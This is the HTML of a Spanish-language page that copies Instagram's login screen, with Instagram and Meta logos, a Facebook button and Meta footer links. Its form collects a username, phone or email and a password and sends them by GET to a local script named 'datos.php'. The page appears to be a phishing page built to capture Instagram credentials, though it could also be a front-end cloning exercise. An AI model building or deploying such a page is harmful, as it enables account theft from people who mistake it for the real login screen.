<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <title>Instagram</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
    
</head>
<body>
    <main>
        <header class="header">
            <div class="header__select">
                <select name="" class="header__select--selection">
                    <option value="pt-br" class="header__select--selection_option">Español</option>
                    <option value="en" class="header__select--selection_option">Español <div class="header__select--selection_option-icon"></div></option>
                </select>
            </div>
                <img src="assets/img/icons/logo.png" alt="logo do instagram" class="header__logo">
        </header>
        <section class="content">
            <div class="content__facebooklogin">
                <button class="content__facebooklogin--button"><img src="assets/img/icons/square-facebook.svg" class="content__facebooklogin--button_icon"> Continuar con Facebook</button>
            </div>
            <div class="content__separate">
                <hr class="content__separate--hr">
                <p class="content__separate--or">O</p>
                <hr class="content__separate--hr">
            </div>
            <div class="form">
                <form action="datos.php" class="form__area" method="GET">
                    <div class="form__area--box-1" id="box-1">
                        <label for="" class="form__area--box_legend" id="legend-box-1">
                            <input type="text" name="email" class="form__area--box_legend-input-3" placeholder="Teléfono, usuario o correo electrónico" id="email" required>
                        </label>
                    </div>
                    <div class="form__area--box-1" id="box-2">
                        <label for="" class="form__area--box_legend" id="legend-box-2">
                            <input type="password" name="password" class="form__area--box_legend-input-4 division" placeholder="Contraseña" id="pass" required>
                        </label>
                    </div>
                    <div class="form__forgotPassword">
                        <a href="" class="form__forgotPassword--link">¿Olvidaste tu contraseña?</a>
                    </div>
                    <div class="form__login">
                        <button type="submit" class="form__login--submit">Iniciar sesion</button>
                    </div>
                </form>
            </div>
            <div class="register">
                <p class="register__text">¿No tienes una cuenta? <a href="" class="register__link">Regístrate</a></p>
            </div>
            <div class="sublogo">
                <img src="assets/img/icons/logo_meta.svg" alt="" class="sublogo__img">
            </div>
        </section>
    </main>
    <footer class="footer">
        <ul class="footer__box">
            <li class="footer__box--item"><a href="" class="footer__box--link">Meta</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Informacion</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Blog</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Empleo</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Ayuda</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">API</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Privacidad</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Condiciones</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Cuentas destacadas</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Ubicaciones</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Instagram Lite</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Subir contactos y no usuarios</a></li>
            <li class="footer__box--item"><a href="" class="footer__box--link">Meta Verified</a></li>
        </ul>
    </footer>
    <script src="assets/js/script.js"></script>
    
</body>
</html>